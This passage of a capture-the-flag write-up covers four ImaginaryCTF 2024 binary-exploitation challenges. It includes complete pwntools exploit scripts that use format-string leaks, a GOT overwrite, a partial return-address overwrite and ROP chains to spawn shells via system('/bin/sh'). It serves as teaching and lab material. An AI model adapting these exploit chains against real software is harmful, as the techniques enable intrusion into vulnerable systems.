- Exploit the buffer overflow to call `system('/bin/sh')`

I won't go through how i got those leaks because i'm tired and i've done that multiple times in my writeups

So i'll just show you my exploit

Here's my solve [script](https://github.com/7h30ry/writeups/blob/main/ImaginaryCTF24/Solve%20Scripts/Imgstore/solve.py)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('imgstore_patched')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x1E6F
breakrva 0x1ECD 
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# ** Goal function sell book: sell_book **
# - leak the rand buf generated from /dev/urandom + canary + libc
# - overwrite the global variable to match (rand_buf * 334873123)
# - overflow to one_gadget


def init():
    global io

    io = start()


def solve():

    leak = "%6$p.%7$p.%13$p.%17$p"
    io.recvuntil(">>")
    io.sendline("3")
    io.sendline(leak)

    io.recvuntil("title --> ")
    leaked = io.recvline().split(b'.')
    exe.address = int(leaked[0], 16) - 0x6060
    rand_buf = int(leaked[1], 16) & 0xffff
    libc.address = int(leaked[2], 16) - 0x8459a
    canary = int(leaked[3], 16)
    
    info("rand_buf: %#x", rand_buf)
    info("canary: %#x", canary)
    info("libc base: %#x", libc.address)
    info("elf base: %#x", exe.address)

    offset = 8
    write_val = (0x13F5C223 * rand_buf) & 0xffffffff
    check = exe.address + 0x6050
    
    info("write -> %#x what -> %#x", check, write_val)

    write = {
        check: write_val
    }

    payload = fmtstr_payload(offset, write, write_size='short')

    io.sendline('y')
    io.sendline(payload)

    offset = 104
    pop_rdi = exe.address + 0x02313 # pop rdi; ret;
    sh = next(libc.search(b'/bin/sh')) # /bin/sh
    ret = exe.address + 0x101a # ret;
    system = libc.sym['system']

    payload = flat({
        offset: [
            canary,
            b'A'*8,
            pop_rdi,
            sh,
            ret,
            system
        ]
    })

    io.sendline(payload)

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()
```

Running it works
![image](https://github.com/user-attachments/assets/7fc9a71e-04ed-4943-ba19-b924709e7e49)
![image](https://github.com/user-attachments/assets/9ef83b2c-aa11-42fd-ab89-79b8dccd1af8)

```
Flag: ictf{b4byy_f3rM4T_5Tr1nn66S}
```

#### Ropity
![image](https://github.com/user-attachments/assets/a541eff1-744f-4366-bb76-64c2399f5ff0)

We are given a binary, checking the file type and protections enabled showed this
![image](https://github.com/user-attachments/assets/52986546-c8f4-414b-a577-bd0b1bbf58d0)

So we are working with a x64 executable which is dynamically linked and not stripped

And we can see that the only protections enabled is `NX` which prevents shellcode execution on the stack (NOT LIKE WE NEED THIS)

I ran the binary to get an overview of what it does
![image](https://github.com/user-attachments/assets/b302c8ec-182c-44cd-ae76-cb1a7f638a23)

It seems it would receive our input then exit?

To know that I decompiled the binary using IDA

Here's the main function
![image](https://github.com/user-attachments/assets/64ee6ee0-3502-4cb4-81e1-d39c55574555)

Very small code

The available functions are

![image](https://github.com/user-attachments/assets/f883a214-3c83-46a2-90a4-69b2432af061)

There's a function which caught my attention and it's called `printfile`
![image](https://github.com/user-attachments/assets/a024b8e6-a35d-4a24-a97e-0dca58bf28e4)

And basically, what it does is open the file stored in the rdi register and print its contents to stdout

Ok we can tell at this point our goal would be to call this function because it wasn't referenced in the main function

Speaking of main function what's the bug there?

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[8]; // [rsp+8h] [rbp-8h] BYREF

  return (unsigned int)fgets(s, 256, _bss_start);
}
```

Well it's an obvious buffer overflow because we are reading in at most 256 bytes into a buffer that can only hold up 8 bytes

Ok so we can tell this our goal is to redirect the instruction pointer to the `printfile` function passing `flag.txt` as the parameter (`$rdi`)

I checked for available gadgets and to be surprise (not) i saw that there wasn't any gadget that can let me control the `rdi` register directly
![image](https://github.com/user-attachments/assets/be6d3c92-7bf7-4062-b327-e086ea00bc25)
![image](https://github.com/user-attachments/assets/40c81491-43d8-4a1d-9cab-0e088e333907)

And note `rop gadgets` are gadgets that pop values from the stack into a regsiter, hence writing arbitrary values to registers

How do we go around this issue?

We need to look at the disassembly more closely

```c
; int __fastcall main(int argc, const char **argv, const char **envp)
public main
main proc near

s= byte ptr -8

; __unwind {
endbr64
push    rbp
mov     rbp, rsp
sub     rsp, 10h
mov     rdx, cs:__bss_start ; stream
lea     rax, [rbp+s]
mov     esi, 100h       ; n
mov     rdi, rax        ; s
call    _fgets
nop
leave
retn
; } // starts at 401136
main endp
```

Remember the fact that we can control the `rip` which means we can redirect the program execution to anywhere in memory

Looking at how `fgets` setups the register we see this:

```
RDI -> The buffer to write to
RSI -> The number of characters to read
RDX -> File stream to read from
```

After `fgets` returns, it puts a pointer to the buffer it wrote to into the `rax` register

This is how the buffer stored in `rdi` is gotten from:

```
lea rax, [rbp-8]
mov rdi, rax
```

What we can do here is to make fgets write `flag.txt\0` into memory then we look for a gadget that lets us move between register preferably `rax, rdi`

Because `rdi` is gotten from `rbp-8` we need to control the `rbp` register and it should hold the address of where we want to write to

Luckily there's a `pop rbp; ret` gadget
![image](https://github.com/user-attachments/assets/a44fb75f-9ba8-44b7-b0d2-889b5fcc5151)

Here's a POC which shows that it works!
![image](https://github.com/user-attachments/assets/5b3c680c-7fbb-4212-b12b-c5ae3c6876b1)

When I run it in a debugger
![image](https://github.com/user-attachments/assets/e2dc181a-2789-45ab-837a-0db919b9c4d7)

We can see that it's going to read our input and store it in `data_start` which is the hardcoded address `0x404020`

But after it does that the `rdi` doesn't hold our string read in but instead it's in the `rax`
![image](https://github.com/user-attachments/assets/7478c121-8683-423f-8b73-d020391c6561)

What do we do about this?

Initially I tried looking for gadgets that can `mov rdi, rax; ret` but too bad I didn't see any

So what's the way around this?

To get around this, we will use something called the GOT (Global Offset Table). Since most C binaries are dynamicallly linked, the binary has to somehow know how to jump to external locations, such as the address of fgets inside libc. This is done as follows:
- The binary maintains two tables: the PLT (Procedure Linkage Table) and the GOT (Global Offset Table).
- The entries of the PLT are called PLT stubs. Each external function called by the binary has a corresponding stub. Each stub jumps to an address stored in a corresponding GOT entry.
- The first time an external function, such as fgets, is called, its address inside libc is dynamically resolved using a function called `__dl_runtime_resolve`. However, calling this function is costly, so the address returned by this function is stored in the GOT entry.
- Subsequent calls to the function can now jump to the address stored in the GOT instead of calling `__dl_runtime_resolve again`. This means that if we can overwrite the GOT entry of a function, such as fgets( which we can with our arbitrary write primitive), with another address in an executable region (such as printfile), all subsequent calls to the function will instead go to the function we want.

With that we can leverage this to complete our exploit

Here's how my exploit goes:
- Use the arbitrary write primitive to overwrite the GOT entry for `fgets` with `printfile`, and to write `flag.txt\0` in a writable region
- Call the `main` function again, and this time set `rbp` to point 8 bytes after the address of `flag.txt\0`. This will cause the function to move a pointer to this address into rdi, but this time because we’ve overwritten the GOT entry, when fgets will get called we’ll jump to `printfile` instead. There’s another small problem to solve: since we’re changing the of `rbp` and then executing a `leave` instruction at the end of main, the value of `rsp` will also get changed to point to the new value of `rbp`, so we’ll have to write our return addresses directly after `rbp` so that when ret is executed it’ll pop the addresses we want.

Solve [script](https://github.com/7h30ry/writeups/blob/main/ImaginaryCTF24/Solve%20Scripts/Ropity/solve.py)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+38
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():

    offset = 16
    pop_rbp = 0x000000000040111d # pop rbp; ret;
    call_fgets =  0x0000000000401142

    payload = flat({
        offset: [
            pop_rbp,
            exe.got['fgets'] + 8,
            call_fgets
        ]
    })

    io.sendline(payload)

    rop = flat([
        exe.sym['printfile'],
        0x0,
        pop_rbp,
        exe.got['fgets'] + 0x30,
        call_fgets,
        b"flag.txt",
        0x0
    ])

    io.sendline(rop)

    io.interactive()


def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

```

Running it works
![image](https://github.com/user-attachments/assets/e22751d2-9c62-4ad9-a07d-9bd6ebffb79f)

```
Flag: ictf{pop_rdi_L}
```

#### Fermat
![image](https://github.com/user-attachments/assets/381ca118-a11b-4e5e-a89d-f66fc3ea1bb8)

After downloading the attached file I patched the binary to use the libc provided

Here's the file type and protection enabled on it
![image](https://github.com/user-attachments/assets/9d7a25e4-2573-4de2-9ff4-883be5895efc)

So we are working with a x64 binary which is dynamically linked and not stripped

From the protections enabled we can see that only the `Stack Canary` is disabled hmmm

I ran the binary to get an overview of what it does
![image](https://github.com/user-attachments/assets/0a3ad403-dc01-41cb-96cc-666002bddb9f)

It seems to receive our input then print it out back

Using IDA i decompiled the binary, here's the main function
![image](https://github.com/user-attachments/assets/2f7fade0-69fe-42b9-818d-4acdcf033a2b)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[256]; // [rsp+0h] [rbp-100h] BYREF

  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  read(0, buf, 296uLL);
  if ( strchr(buf, 'n') )
    __assert_fail("strstr(buf, \"n\") == NULL", "vuln.c", 0xEu, "main");
  printf(buf);
  return 0;
}
```

Pretty straightforward! 
- It receives at most 296 bytes of input into a buffer that can only hold up 256 bytes of data
- It checks for the occurrence of `n` in the `buf` and if the assertion fails it would exit
- Else it would print our `buf` and returns

There are two bugs present here:
- Buffer overflow
- Format string bug

How do we go about exploiting this?

Because the binary has no function after `printf` it would tend to return to `__libc_start_main`, and since `PIE` is enabled we can't easily control the return address to jump back to `main`

First thing I tried doing was getting the offset required to overwrite the return address using the standard `pattern create` on `gdb-gef` but I ran into this issue
![image](https://github.com/user-attachments/assets/e96936c8-761f-426b-920a-dcf962e6da11)
![image](https://github.com/user-attachments/assets/0f310654-0973-4da3-8876-1620df8de2bf)

It exists because the `assertion` was triggerd

And what triggered it is because the cyclic pattern had occurrence of `n`

So I decided to calculate the offset manually 

From the decompilation we have this
![image](https://github.com/user-attachments/assets/187eb4e6-643c-46dc-bba2-c44d7362ed46)

We have variable `buf` which is a buffer that has size of 256 bytes

Since that's the only variable present on the stack frame the difference between it and the return address is going to be:

```
256 + 8 = 264
```

The 8 comes from the fact that the saved rbp is present therefore the offset is `264`

Ok now what?

Before the program prints our input here's how the stack looks like
![image](https://github.com/user-attachments/assets/09b7ee7d-3665-4606-932a-fe9d83de5d60)

We can see that after our input there's a libc address next to it

Checking it shows it's `__libc_start_call_main+128`
![image](https://github.com/user-attachments/assets/8e52ac30-03e8-45c2-9e17-e900716ff8f5)

And that address is basically where the prorgam is going to return too after it `ret`
![image](https://github.com/user-attachments/assets/2fc0a070-84c2-441b-8006-f4da30047a1a)

What we can do here is to perform partial overwrite such that instead of it returning to `__libc_start_call_main+28` it would return to `main`

How can we do that when the address isn't even in the executable memory region?

One thing you should know is that before `main` is called, `__libc_start_call_main` actually calls it

So we just need to overwrite the lsb to the part where it's about to call `main`

Here's the disassembly
![image](https://github.com/user-attachments/assets/6fb8c73b-1d23-4234-8f9b-d99f57afcee0)

And from debugging you can confirm that it does indeed call main that's why the main stack frame tends to return to the next address after the `call` instruction
![image](https://github.com/user-attachments/assets/0ba7ca46-413f-4941-857d-e740141204f3)

So now what?

Well we just overwrite the lsb to `0x66` since that's where the setup starts
![image](https://github.com/user-attachments/assets/c2b85f9f-d2d5-4171-8e39-50db7bc17e19)

Doing that we can see that it not only jumps back to main but also leaks the address of `__libc_start_call_main+102`
![image](https://github.com/user-attachments/assets/356fba0f-2497-4063-bc90-be30771f1c94)

So we can use that to calculate the libc base address then perform rop to spawn a shell using this:

```
pop rdi
/bin/sh
ret
system
```

Here's my final [exploit](https://github.com/7h30ry/writeups/blob/main/ImaginaryCTF24/Solve%20Scripts/Fermat/solve.py)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln_patched')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x01269
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    offset = 264

    payload = b'a'*offset
    payload += p8(0x66)

    io.send(payload)

    io.recvuntil(b'a'*offset)
    leak = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = leak - 0x29d66

    info("libc base: %#x", libc.address)

    pop_rdi = libc.address + 0x2a3e5 # pop rdi ; ret
    sh = next(libc.search(b'/bin/sh\x00'))
    ret = libc.address + 0x29cd6 # ret
    system = libc.sym['system']

    payload = b'a'*offset
    payload += p64(pop_rdi)
    payload += p64(sh)
    payload += p64(ret)
    payload += p64(system)

    io.sendline(payload)

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()
```

Running it works
![image](https://github.com/user-attachments/assets/4a36337e-34d3-45c9-8d75-ac0c831a5d73)

```
Flag: ictf{im_really_out_of_format_string_ideas.}
```

#### ICTF-Band
![image](https://github.com/user-attachments/assets/f50195ea-5e32-4271-b50e-db522136d3cd)

After downloading the attached file and patching it to use the remote libc I checked the file type
![image](https://github.com/user-attachments/assets/5d31bb32-4df9-4ea1-9b8c-ae153f122f22)

We are working with a 64bits binary which is dynamically linked and not stripped

All protections are enabled except Stack Canary

I ran it to get an overview of what it does
![image](https://github.com/user-attachments/assets/fc55b0f3-d026-4619-9daf-4951ded8d4fa)

Oh well, let's go ahead to reverse engineer it

I used IDA and here's the main function
![image](https://github.com/user-attachments/assets/cdacdc01-b328-4a1d-be65-700db62814b7)

The first function after decompilation shows this
![image](https://github.com/user-attachments/assets/057bf46f-26a3-439f-94bc-d9478adc5051)

This setup disables buffering on `stdin, stdout & stderr`

So I renamed the function

```c
int setup()
{
  alarm(0x78u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  return setvbuf(stderr, 0LL, 2, 0LL);
}
```

The second function seems to be the menu function
![image](https://github.com/user-attachments/assets/c663520d-3889-4e40-98a3-e33a63796b21)

And after reversing it this is how it looks like
![image](https://github.com/user-attachments/assets/34803a9c-665c-4cca-a4b8-d81ebc0e0087)

```c
__int64 menu()
{
  int choice; // [rsp+Ch] [rbp-4h] BYREF

  do
  {
    sub_1338();
    puts("[1]. Name a song.");
    puts("[2]. Join the band.");
    puts("[3]. Write lyrics.");
    puts("[4]. Exit.");
    printf(">> ");
    __isoc99_scanf("%1d", &choice);
    getchar();
    if ( choice == 4 )
    {
      puts(byte_3080);
      printf("\x1B[1;33m");
      puts("Goodbye!");
      printf("\x1B[0m");
    }
    else
    {
      if ( choice <= 4 )
      {
        switch ( choice )
        {
          case 3:
            write();
            continue;
          case 1:
            name();
            continue;
          case 2:
            join();
            continue;
        }
      }
      puts(byte_3080);
      printf("\x1B[1;33m");
      puts("[/] Invalid option..");
      printf("\x1B[0m");
      puts(byte_3080);
    }
  }
  while ( choice != 4 );
  return exit_0();
}
```

The only function which allows us give it input is `name and exit`

And the bug resides there

I won't go through it in details i'll just give an overview of it

```c
char ptr[52]

 printf("Would you like to buy one or maybe more? [y/n]: ");
      __isoc99_scanf("%c", &v4);
      if ( v4 == 121 )
      {
        printf("The album should be pre-ordered. Tell us how many you want, we will contact you soon: ");
        __isoc99_scanf("%d", &v2);
        getchar();
        printf("Tell us your e-mail: ");
        fread(ptr, 1uLL, v2, stdin);
        puts(byte_3080);
        printf("\x1B[1;33m");
        puts("[YOUR DATA] Please validate before continuing: ");
        printf("\x1B[0m");
        puts(ptr);
        puts(byte_3080);
        printf("It's verified [y/n]: ");
        __isoc99_scanf("%c", &v3);
```

The bug is that it allows us specify the size to read in into the `ptr` array 

We can overflow that and overwrite the null byte therefore when it calls `puts(ptr)` we would get a libc leak

How i know it's a libc leak is because i checked the stack when it's about to call `puts(ptr)` and the value after our input is a libc address

But the catch is that there's a certain condition which only then would allow us access that portion

You can check the [decompilation](https://github.com/7h30ry/writeups/blob/main/ImaginaryCTF24/Solve%20Scripts/ICTF-Band/name.c) to figure it but i'll show it here
![image](https://github.com/user-attachments/assets/67f8a283-d271-45ae-8deb-0fabba016327)

Basically the slot has to be greater than 5 or less than 0 then album count should not be greater than 0, if we do that then we will reach that vulnerable part of the function

In my case i used slot value as `6` and album count as `0`

And from there I leaked libc and ret2libc

Here's my exploit [script](https://github.com/7h30ry/writeups/blob/main/ImaginaryCTF24/Solve%20Scripts/ICTF-Band/solve.py)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ictf-band_patched')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x189F 
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def leak_libc():
    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b"Slot [1-5]:", b"7")
    io.sendlineafter(b"Album Count:", b"0")
    io.sendlineafter(b"[y/n]:", b"y")
    io.sendlineafter(b"Tell us how many you want, we will contact you soon:", b"17")
    io.recvuntil("Tell us your e-mail:")
    io.sendline(b'a'*16)
    io.recvuntil(b"a"*16)
    io.recvline()
    libc.address = u64(b'\x00' + io.recvline().strip().ljust(7, b'\x00')) - 0x21b700

    io.sendlineafter(b":", b"y")

def solve():

    leak_libc()

    offset = 0x98
    pop_rdi = libc.address + 0x000000000002a3e5
    sh = next(libc.search(b'/bin/sh\x00'))
    ret = libc.address + 0x0000000000029139
    system = libc.sym['system']


    info("libc base: %#x", libc.address)

    payload = flat({
        offset: [
            pop_rdi,
            sh,
            ret,
            system
        ]
    })

    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b"Slot [1-5]:", b"7")
    io.sendlineafter(b"Album Count:", b"0")
    io.sendlineafter(b"[y/n]:", b"y")
    io.sendlineafter(b"Tell us how many you want, we will contact you soon:", str(len(payload)+1).encode())
    io.recvuntil("Tell us your e-mail:")
    io.sendline(payload)
    io.sendlineafter(b"It's verified [y/n]:", b"y")


    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()
```

Running it works
![image](https://github.com/user-attachments/assets/b645ef38-3e04-4df9-9a4a-f7755c2be2e5)

```
Flag: ictf{F0rg3t_t0_pUt_c4N4r1y_pr0T3ction5}
```

So that's all for now

I managed to solve `WatchDog`  and `Bopity` (this was Ropity part2 and it required getting shell xd)

But i'm so tired because i've been writing for hours now LMAO

So incase you want the solve script you can find it [here](https://github.com/7h30ry/writeups/blob/main/ImaginaryCTF24/Solve%20Scripts/Watchdog/solve.py)

For those of you who managed to read as far as this TYSM

But if that wasn't the case still TY 🙏

Sayonara 😅



























